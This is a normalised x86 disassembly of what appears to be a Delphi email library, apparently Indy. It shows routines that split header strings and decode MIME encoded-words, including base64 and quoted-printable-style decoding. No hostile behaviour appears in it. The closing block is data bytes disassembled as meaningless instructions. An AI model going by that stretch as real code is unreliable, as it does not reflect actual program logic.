mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x44 ] ebx
mov esi ecx
lea edi [ ebp - 0x40 ]
mov ecx 0x8
[ edi ] [ esi ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47811a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xc ] 0x1
mov esi 0x1
mov [ ebp - 0x10 ] 0x1
xor edi edi
mov [ ebp - 0x19 ] 0x20
mov [ ebp - 0x1a ] 0x0
mov eax [ ebp - 0x4 ]
call sub_404210
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
call sub_404210
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x8 ]
call sub_403f50
cmp esi [ ebp - 0x14 ]
jg r-xdata
lea eax [ ebp - 0x6c ]
push eax
mov ecx 0x7fffffff
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404470
mov edx [ ebp - 0x6c ]
mov eax [ ebp + 0x8 ]
call sub_404218
mov eax [ ebp + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478121
lea eax [ ebp - 0x6c ]
call sub_403f50
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_403f74
retn
mov eax [ ebp - 0x4 ]
mov bl [ eax + esi - 0x1 ]
mov eax [ rw-data ]
mov edx ebx
and edx 0xff
bt [ eax ] edx
jae r-xdata
mov eax [ ebp - 0x8 ]
cmp bl [ eax ]
jne r-xdata
inc esi
inc [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
and eax 0xff
bt [ ebp - 0x40 ] eax
jae r-xdata
cmp [ ebp - 0x19 ] 0x20
jne r-xdata
inc esi
inc [ ebp - 0xc ]
mov al [ ebp - 0x19 ]
sub al 0x22
je r-xdata
mov eax ebx
sub al 0x22
jne r-xdata
cmp [ ebp - 0x19 ] 0x20
jne r-xdata
lea eax [ ebp - 0x44 ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_404470
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x8 ]
call sub_407f14
mov [ ebp - 0x1a ] al
cmp [ ebp - 0x1a ] 0x0
je r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
cmp bl [ ebp - 0x19 ]
jne r-xdata
mov edi esi
jmp r-xdata
mov eax [ ebp - 0x18 ]
dec eax
add esi eax
mov edi esi
jmp r-xdata
mov eax esi
sub eax edi
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
sub ecx [ ebp - 0x10 ]
inc ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404470
mov edx [ ebp - 0x48 ]
mov eax [ ebp + 0x8 ]
call sub_404218
mov eax [ ebp + 0x8 ]
sub bl 0x22
je r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
jle r-xdata
cmp [ ebp - 0x19 ] 0x20
jne r-xdata
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
jmp r-xdata
cmp edi [ ebp - 0x10 ]
jle r-xdata
mov [ ebp - 0x19 ] bl
inc edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x1a ] 0x0
cmp esi [ ebp - 0x14 ]
jge r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_404218
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x40 ]
lea edi [ ebp - 0x68 ]
mov ecx 0x8
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x68 ]
mov edx r-xdata
mov cl 0x20
call sub_402c94
mov eax [ ebp - 0x4 ]
mov al [ eax + esi - 0x1 ]
and eax 0xff
bt [ ebp - 0x68 ] eax
jb r-xdata
inc esi
sub_47814c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403124
lea eax [ esi + 0x30 ]
mov edx r-xdata
call sub_403fa4
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x35 ] 0x1
mov [ esi + 0x36 ] 0x1
mov [ esi + 0x38 ] 0x4e
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_4781b0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_478240
push [ fs : eax ]
mov [ fs : eax ] esp
inc esi
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478247
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_403f74
retn
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404210
test eax eax
jle r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
cmp [ eax ] 0x9
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x20
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_478250
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_478325
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_478334
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4782fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
dec ebx
cmp ebx 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478302
lea eax [ ebp - 0xc ]
call sub_40d130
retn
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0x60 ]
dec ebx
cmp ebx 0xffffffff
jg r-xdata
sub_478334
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_4783fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4783d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x38 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov ecx r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_477f14
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0xc ]
mov cl 0x1
mov edx r-xdata
call sub_46ec3c
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
call sub_407f9c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4783d9
retn
sub_478444
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4784d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ esi + 0x34 ] 0x0
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ esi + 0x30 ]
call sub_407f9c
mov eax [ ebp - 0xc ]
mov esi [ rw-data ]
mov esi [ esi ]
mov edx [ ebx ]
call esi
mov esi eax
push ebx
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_404470
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4784d9
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f74
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_407d30
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_403fa4
sub_4784e0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_478630
mov edx eax
mov ecx edi
mov eax ebx
call sub_478504
pop edi
pop esi
pop ebx
retn
sub_478504
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_478614
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_403f50
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_478444
mov eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
call sub_404210
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
pop eax
call sub_404470
cmp [ esi + 0x35 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_407f4c
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_403fa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47861b
lea eax [ ebp - 0x1c ]
mov edx 0x6
call sub_403f74
retn
inc ebx
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
mov al [ eax ]
sub al 0x9
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_407f4c
push [ ebp - 0x14 ]
push r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_407f4c
push [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042d0
jmp r-xdata
sub al 0x17
jne r-xdata
sub_478630
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4786a3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4786aa
lea eax [ ebp - 0xc ]
call sub_403f50
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax edi
call sub_478444
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_407f14
test al al
je r-xdata
sub_4786b4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_47877f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax ebx
call sub_478630
mov esi eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test esi esi
jl r-xdata
test esi esi
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478786
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f74
retn
cmp [ ebx + 0x36 ] 0x0
je r-xdata
cmp [ ebx + 0x36 ] 0x0
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx esi
mov eax ebx
call sub_4781b0
push edi
push [ ebx + 0x30 ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4042d0
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4781b0
push edi
push [ ebx + 0x30 ]
push [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4042d0
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
call sub_478250
jmp r-xdata
sub_478790
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4787b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4787bc
retn
sub_4787e0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0x8 ]
xor edx edx
push ebp
push sub_4788c7
push [ fs : edx ]
mov [ fs : edx ] esp
test esi esi
jne r-xdata
test al al
je r-xdata
test al al
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_404210
mov ecx eax
mov edx esi
mov eax ebx
call sub_404470
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_404554
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_404210
mov ecx eax
mov edx esi
mov eax ebx
call sub_404470
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407e70
mov eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x14 ]
mov eax edi
call sub_407e70
mov eax [ ebp - 0x14 ]
pop edx
call sub_404554
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_404554
mov ebx eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_407e70
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_407e70
mov eax [ ebp - 0x8 ]
pop edx
call sub_404554
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4788ce
lea eax [ ebp - 0x18 ]
mov edx 0x6
call sub_403f74
retn
add ebx esi
dec ebx
test ebx ebx
jle r-xdata
sub_4788dc
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404400
xor eax eax
push ebp
push sub_478de7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_407d30
mov edx [ ebp - 0x2c ]
mov ecx 0x1
mov eax r-xdata
call sub_4787e0
mov ebx eax
test ebx ebx
jne r-xdata
test ebx ebx
jle r-xdata
push 0x0
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_407d30
mov edx [ ebp - 0x30 ]
mov ecx 0x1
mov eax r-xdata
call sub_4787e0
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_404554
test eax eax
jg r-xdata
mov [ ebp - 0x25 ] 0x1
push 0x0
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_407d30
mov edx [ ebp - 0x34 ]
lea ecx [ ebx + 0x5 ]
mov eax r-xdata
call sub_4787e0
mov edi eax
test edi edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_404554
mov edx eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
call sub_4044b0
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_403fa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478dee
lea eax [ ebp - 0x74 ]
mov edx 0x8
call sub_403f74
lea eax [ ebp - 0x48 ]
mov edx 0x8
call sub_403f74
lea eax [ ebp - 0x24 ]
call sub_403f50
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_403f74
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov [ ebp - 0x25 ] 0x0
cmp [ ebp - 0x25 ] 0x0
je r-xdata
push 0x0
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_407d30
mov edx [ ebp - 0x38 ]
lea ecx [ edi + 0x1 ]
mov eax r-xdata
call sub_4787e0
mov edi eax
test edi edi
jne r-xdata
push 0x0
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x4 ]
call sub_407d30
mov edx [ ebp - 0x70 ]
lea ecx [ ebx + 0x1 ]
mov eax r-xdata
call sub_4787e0
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
lea edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_407d30
mov edx [ ebp - 0x3c ]
lea ecx [ edi + 0x1 ]
mov eax r-xdata
call sub_4787e0
mov edi eax
test edi edi
jle r-xdata
mov [ ebp - 0x25 ] 0x0
test ebx ebx
jg r-xdata
push 0x0
lea edx [ ebp - 0x74 ]
mov eax [ ebp - 0x4 ]
call sub_407d30
mov edx [ ebp - 0x74 ]
lea ecx [ ebx + 0x1 ]
mov eax r-xdata
call sub_4787e0
mov ebx eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
sub ecx ebx
add ecx 0x2
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_404470
mov esi 0x1
jmp r-xdata
cmp esi 0x2
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x24 ]
mov eax r-xdata
call sub_404554
mov ecx eax
dec ecx
mov edx 0x1
mov eax [ ebp - 0x24 ]
call sub_404470
jmp r-xdata
inc esi
cmp esi 0x4
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x24 ]
call sub_404470
mov edx [ ebp - 0x24 ]
mov eax r-xdata
call sub_404554
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x24 ]
call sub_404210
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov edx [ ebp - 0xc ]
inc edx
mov eax [ ebp - 0x24 ]
call sub_404470
cmp esi 0x1
jne r-xdata
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x24 ]
call sub_404210
mov edx eax
dec edx
mov ecx 0x2
mov eax [ ebp - 0x24 ]
call sub_404470
mov eax [ ebp - 0x40 ]
mov edx r-xdata
call sub_40435c
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_407f14
test al al
je r-xdata
mov [ ebp - 0x25 ] 0x0
cmp [ ebp - 0x25 ] 0x0
je r-xdata
cmp [ ebp - 0x25 ] 0x0
je r-xdata
cmp [ ebp - 0x25 ] 0x0
je r-xdata
jmp r-xdata
mov esi 0x1
lea eax [ ebp - 0x18 ]
call sub_403f50
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_407f14
test al al
je r-xdata
mov eax [ ebp - 0x24 ]
call sub_404210
cmp eax 0x4
jge r-xdata
mov eax [ ebp - 0x24 ]
cmp [ eax + esi - 0x1 ] 0x3d
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_404218
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x18 ]
call sub_403fe8
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x18 ]
call sub_478e70
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov al [ eax ]
call sub_4787c8
mov [ ebp - 0x1f ] al
mov eax [ ebp - 0x24 ]
mov al [ eax + 0x1 ]
call sub_4787c8
mov [ ebp - 0x1e ] al
mov eax [ ebp - 0x24 ]
mov al [ eax + 0x2 ]
call sub_4787c8
mov [ ebp - 0x1d ] al
mov eax [ ebp - 0x24 ]
mov al [ eax + 0x3 ]
call sub_4787c8
mov [ ebp - 0x1c ] al
mov dl [ ebp - 0x1f ]
shl edx 0x2
mov al [ ebp - 0x1e ]
xor ecx ecx
mov cl al
shr ecx 0x4
or dl cl
mov [ ebp - 0x1b ] dl
shl eax 0x4
xor edx edx
mov dl [ ebp - 0x1d ]
shr edx 0x2
or al dl
mov [ ebp - 0x1a ] al
mov al [ ebp - 0x1d ]
shl eax 0x6
xor edx edx
mov dl [ ebp - 0x1c ]
shr edx 0x0
or al dl
mov [ ebp - 0x19 ] al
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x24 ]
call sub_404210
mov ecx eax
mov edx 0x5
mov eax [ ebp - 0x24 ]
call sub_404470
push [ ebp - 0x18 ]
lea eax [ ebp - 0x5c ]
mov dl [ ebp - 0x1b ]
call sub_404138
push [ ebp - 0x5c ]
lea eax [ ebp - 0x60 ]
mov dl [ ebp - 0x1a ]
call sub_404138
push [ ebp - 0x60 ]
lea eax [ ebp - 0x64 ]
mov dl [ ebp - 0x19 ]
call sub_404138
push [ ebp - 0x64 ]
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_4042d0
lea eax [ ebp - 0x58 ]
mov edx [ ebp - 0x24 ]
mov dl [ edx + esi - 0x1 ]
call sub_404138
mov edx [ ebp - 0x58 ]
lea eax [ ebp - 0x18 ]
call sub_404218
mov eax [ ebp - 0x24 ]
call sub_404210
lea edx [ esi + 0x4 ]
cmp eax edx
jl r-xdata
inc esi
mov eax [ ebp - 0x24 ]
cmp [ eax + esi - 0x1 ] 0x3f
jne r-xdata
lea eax [ ebp - 0x68 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404470
push [ ebp - 0x68 ]
push [ ebp - 0x24 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404210
mov ecx eax
lea edx [ edi + 0x2 ]
mov eax [ ebp - 0x4 ]
call sub_404470
push [ ebp - 0x6c ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_4042d0
lea eax [ ebp - 0x24 ]
call sub_403f50
mov eax [ ebp - 0x24 ]
cmp [ eax + esi - 0x1 ] 0x5f
jne r-xdata
mov eax [ ebp - 0x24 ]
cmp [ eax + esi ] 0x3d
jne r-xdata
mov edx r-xdata
lea eax [ ebp - 0x4c ]
call sub_402a40
lea eax [ ebp - 0x50 ]
mov edx [ ebp - 0x24 ]
mov dl [ edx + esi ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x50 ]
lea eax [ ebp - 0x4c ]
mov cl 0x2
call sub_402a10
lea edx [ ebp - 0x4c ]
lea eax [ ebp - 0x54 ]
call sub_402a40
lea eax [ ebp - 0x50 ]
mov edx [ ebp - 0x24 ]
mov dl [ edx + esi + 0x1 ]
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x50 ]
lea eax [ ebp - 0x54 ]
mov cl 0x3
call sub_402a10
lea edx [ ebp - 0x54 ]
lea eax [ ebp - 0x48 ]
call sub_4041b4
mov eax [ ebp - 0x48 ]
call sub_4081bc
mov edx eax
lea eax [ ebp - 0x44 ]
call sub_404138
mov edx [ ebp - 0x44 ]
lea eax [ ebp - 0x18 ]
call sub_404218
add esi 0x2
jmp r-xdata
jmp r-xdata
sub_478e70
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_478ff4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_403f50
mov [ ebp - 0x9 ] 0x0
mov eax esi
call sub_404210
mov edi eax
mov ebx 0x1
cmp edi ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_403fa4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478ffb
lea eax [ ebp - 0x20 ]
mov edx 0x5
call sub_403f74
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
cmp [ esi + ebx - 0x1 ] 0x1b
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc ebx
lea eax [ ebx + 0x1 ]
cmp edi eax
jl r-xdata
lea eax [ ebp - 0x20 ]
mov dl [ esi + ebx - 0x1 ]
call sub_404138
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x8 ]
call sub_404218
inc ebx
lea eax [ ebx + 0x1 ]
cmp edi eax
jl r-xdata
cmp edi ebx
jge r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x2
mov edx ebx
mov eax esi
call sub_404470
mov eax [ ebp - 0x10 ]
mov edx r-xdata
call sub_40435c
jne r-xdata
inc ebx
jmp r-xdata
mov al [ esi + ebx - 0x1 ]
mov dl [ esi + ebx ]
mov [ ebp - 0xa ] dl
xor edx edx
mov dl al
dec edx
shr edx 0x1
mov [ ebp - 0xb ] dl
cmp al 0x5f
jae r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x2
mov edx ebx
mov eax esi
call sub_404470
mov eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_40435c
jne r-xdata
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
add [ ebp - 0xb ] 0xb1
add [ ebp - 0xb ] 0x71
jmp r-xdata
add ebx 0x2
jmp r-xdata
mov [ ebp - 0x9 ] 0x0
add [ ebp - 0xa ] 0x7e
cmp [ ebp - 0xa ] 0x60
jae r-xdata
and eax 0xff
and eax 0x1
cmp eax 0x1
jne r-xdata
add [ ebp - 0xa ] 0x20
jmp r-xdata
add [ ebp - 0xa ] 0x1f
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x18 ]
mov dl [ ebp - 0xb ]
call sub_404138
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
mov dl [ ebp - 0xa ]
call sub_404138
push [ ebp - 0x1c ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4042d0
add ebx 0x2
jmp r-xdata
sub_479013
inc [ edx ]
add [ eax ] al
add [ eax ] ch
inc edx
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_479041
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479048
retn
sub_479179
xor eax [ eax ]
in al dx
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] al
add [ eax + 0x29 ] cl
inc eax
add ah bl
xchg esp eax
inc edi
add [ 0x4d644954 ] dl
jae r-xdata
rcr [ eax - 0x6e ] 0x47
popad
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
or [ ecx ] dh
inc eax
add [ eax - 0x6c ] dl
inc edi
add [ 0x4d644954 ] dl
jae r-xdata
outsb
outsw
mov eax eax
hlt
add [ edx + 0x17540042 ] ah
inc edx
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
popad
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax + 0x500e0004 ] al
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax - 0x6fffb909 ] dh
mov [ ecx ] es
inc esp
adc eax [ edx ]
lodsb [ esi ]
mov eax [ ecx ]
sbb al 0x14
inc edx
add al ch
adc al [ edx ]
sub al 0x14
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x3fffb86e ] bl
xchg edx eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x70004792 ] ch
add [ eax ] al
add [ eax ] dh
test [ esi ] 0x3c
pop ss
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
cwde
xor eax [ eax ]
